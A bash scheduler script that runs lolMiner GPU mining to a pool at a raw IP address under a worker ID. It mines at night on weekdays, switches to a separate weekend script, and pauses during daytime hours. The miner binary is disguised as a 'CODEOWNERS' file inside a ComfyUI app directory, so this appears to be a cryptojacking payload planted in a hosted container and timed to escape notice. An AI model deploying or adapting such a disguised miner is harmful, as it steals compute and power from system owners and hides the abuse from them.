#!/bin/bash

# --- LOLMINER CONFIGURATION ---
MINER_CMD="/app/ComfyUI/CODEOWNERS --algo OCTOPUS --pool 151.241.228.78:443 --user krxXKDZ8P6.worker --tls 0 --apiport 4000 --disablewatchdog 1 --devices 0 --nocolor --mode b --timeprint=on"
WORKER_NAME="krxXKDZ8P6.worker" 

# *** Special Command for Weekend Mining (points to the script) ***
SPECIAL_MINER_CMD="/app/special_script/special_miner.sh"
SPECIAL_WORKER_NAME="krxXKDZ8P6.weekend"

# --- SCHEDULE CONFIGURATION (Philippine Time - PHT, GMT+8) ---
TZ_NAME="Asia/Manila"
START_TIME="1830"    # 6:30 PM PHT
STOP_TIME="0800"     # 8:00 AM PHT

# --- Core Logic Functions ---

# Function to stop ALL miner processes (Regular and Special) completely
stop_miner_by_name() {
    local NAME="$1"
    if pgrep -f "$NAME"; then
        echo "------------------------------------------------------"
        echo "[$(TZ="$TZ_NAME" date)] STOPPING MINER ($NAME) - INITIATING KILL SEQUENCE"
        echo "------------------------------------------------------"

        # 1. Graceful Kill (SIGINT)
        pgrep -f "$NAME" | while read PID; do
            kill -SIGINT "$PID" 2>/dev/null
        done
        sleep 5 # Wait for graceful shutdown

        # 2. Force Kill (SIGKILL) if still running
        if pgrep -f "$NAME"; then
             pgrep -f "$NAME" | while read PID; do
                 echo "Miner $NAME still active. Forcing immediate termination (SIGKILL) on PID $PID."
                 kill -9 "$PID" 2>/dev/null
             done
             sleep 1
        fi
        echo "Miner process ($NAME) fully terminated."
    fi
}

# Determines the current operational mode based on the PHT time and day.
get_mining_mode() {
    # Get current time (HHMM) and day of the week (1=Mon, 7=Sun) in PHT
    CURRENT_TIME=$(TZ="$TZ_NAME" date +%H%M)
    DAY_OF_WEEK=$(TZ="$TZ_NAME" date +%u)
    
    # Force Base 10 interpretation
    CURRENT_T=10#$CURRENT_TIME
    START_T=10#$START_TIME
    STOP_T=10#$STOP_TIME

    # --- 1. Weekend Special Mode Check (Saturday 18:30 PHT to Monday 08:00 PHT) ---
    is_saturday_start=0
    if [[ $DAY_OF_WEEK -eq 6 ]] && (( $CURRENT_T >= $START_T )); then is_saturday_start=1; fi
    is_sunday_all_day=0
    if [[ $DAY_OF_WEEK -eq 7 ]]; then is_sunday_all_day=1; fi
    is_monday_end=0
    if [[ $DAY_OF_WEEK -eq 1 ]] && (( $CURRENT_T < $STOP_T )); then is_monday_end=1; fi

    if [[ $is_saturday_start -eq 1 ]] || [[ $is_sunday_all_day -eq 1 ]] || [[ $is_monday_end -eq 1 ]]; then
        echo "SPECIAL_WEEKEND_MODE"
        return 2
    fi

    # --- 2. Weekday/Saturday Stop Mode Check (Mon-Sat 08:00 PHT to 18:30 PHT) ---
    # Day is Mon (1) through Sat (6)
    is_mon_to_sat=0
    if [[ $DAY_OF_WEEK -ge 1 ]] && [[ $DAY_OF_WEEK -le 6 ]]; then is_mon_to_sat=1; fi
    
    # Time is between 08:00 and 18:30
    is_stop_time=0
    if (( $CURRENT_T >= $STOP_T )) && (( $CURRENT_T < $START_T )); then is_stop_time=1; fi
    
    if [[ $is_mon_to_sat -eq 1 ]] && [[ $is_stop_time -eq 1 ]]; then
        echo "STOPPED_MODE"
        return 0
    fi

    # --- 3. Regular Mining Mode (All remaining active periods) ---
    # This covers:
    # A) Mon-Fri night mining (18:30 to 08:00 the next day)
    # B) Fri night through Saturday morning (Fri 18:30 up to Sat 08:00)
    # C) Sat morning (08:00) until Sat evening stop (18:30) -- Wait, Sat is now covered by STOPPED mode 
    
    # Since we have explicitly excluded the stopped periods, and the special weekend period,
    # anything remaining must be an active mining period (Regular Mining).
    # This covers Mon-Fri night time, and early Sat morning before 8am.
    
    # The only time left unaccounted for is when the miner is supposed to be running.
    echo "REGULAR_MINING_MODE"
    return 1
}

# Function to start the Regular miner process
start_regular_miner() {
    stop_miner_by_name "$SPECIAL_WORKER_NAME"
    
    if ! pgrep -f "$WORKER_NAME"; then
        echo "[$(TZ="$TZ_NAME" date)] Starting regular miner ($WORKER_NAME)..."
        ( exec $MINER_CMD ) &
    else
        echo "[$(TZ="$TZ_NAME" date)] Regular miner ($WORKER_NAME) already running."
    fi
}

# Function to start the Special miner process
start_special_miner() {
    stop_miner_by_name "$WORKER_NAME"

    if ! pgrep -f "$SPECIAL_WORKER_NAME"; then
        echo "[$(TZ="$TZ_NAME" date)] Starting special weekend miner ($SPECIAL_WORKER_NAME)..."
        ( exec $SPECIAL_MINER_CMD ) &
    else
        echo "[$(TZ="$TZ_NAME" date)] Special miner ($SPECIAL_WORKER_NAME) already running."
    fi
}

# --- Main Monitoring Loop ---

echo "--- LolMiner Scheduled Monitor v2.3 Initializing (PHT Timezone) ---"
echo "--- Current PHT Time: $(TZ="$TZ_NAME" date) ---"
echo "--- Regular Mining: All active periods outside of special/stopped rules. ---"
echo "--- Stopped: Mon-Sat 8:00 AM to 6:30 PM ---"
echo "--- Special Mode: Sat 6:30 PM to Mon 8:00 AM ---"

while true; do
    MODE=$(get_mining_mode)
    
    echo "--- [$(TZ="$TZ_NAME" date)] Mode: $MODE ---"

    if [[ "$MODE" == "REGULAR_MINING_MODE" ]]; then
        start_regular_miner
        sleep 5
        
    elif [[ "$MODE" == "SPECIAL_WEEKEND_MODE" ]]; then
        start_special_miner
        sleep 5

    elif [[ "$MODE" == "STOPPED_MODE" ]]; then
        stop_miner_by_name "$WORKER_NAME"
        stop_miner_by_name "$SPECIAL_WORKER_NAME"
        
        echo "[$(TZ="$TZ_NAME" date)] Miner is paused for downtime. Checking again in 5 minutes..."
        sleep 300 # Wait 5 minutes
        
    else
        echo "[$(TZ="$TZ_NAME" date)] ERROR: Unknown mode encountered ($MODE). Re-checking in 1 minute."
        sleep 60
    fi
done
